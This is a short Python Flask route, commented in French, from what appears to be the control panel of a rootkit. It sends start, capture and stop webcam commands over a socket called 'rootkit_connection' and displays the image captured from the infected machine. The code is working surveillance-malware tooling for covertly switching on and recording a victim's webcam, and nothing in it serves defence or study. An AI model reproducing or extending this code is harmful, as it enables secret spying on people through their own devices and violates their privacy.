# ---------------------------------- WEBCAM ---------------------------------- #

@app.route('/webcam', methods=['GET', 'POST'])
def webcam():
    if not authenticated:
        return redirect(url_for('login'))

    webcam_output = ""
    image_path = "/var/www/html/images/capture.jpg"

    if request.method == 'POST':
        action = request.form.get('action')

        try:
            with connection_lock:
                if rootkit_connection:
                    if action == 'start':
                        rootkit_connection.sendall(b"start_webcam\n")
                        webcam_output = "✅ Webcam démarrée."
                    elif action == 'capture':
                        rootkit_connection.sendall(b"capture_image\n")
                        webcam_output = "📸 Image capturée avec succès."
                    elif action == 'stop':
                        rootkit_connection.sendall(b"stop_webcam\n")
                        webcam_output = "🛑 Webcam arrêtée."
                    else:
                        webcam_output = "❌ Action inconnue."
        except Exception as e:
            webcam_output = f"💥 Erreur : {e}"

    # Vérification si l'image existe
    image_exists = os.path.exists(image_path)

    return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)
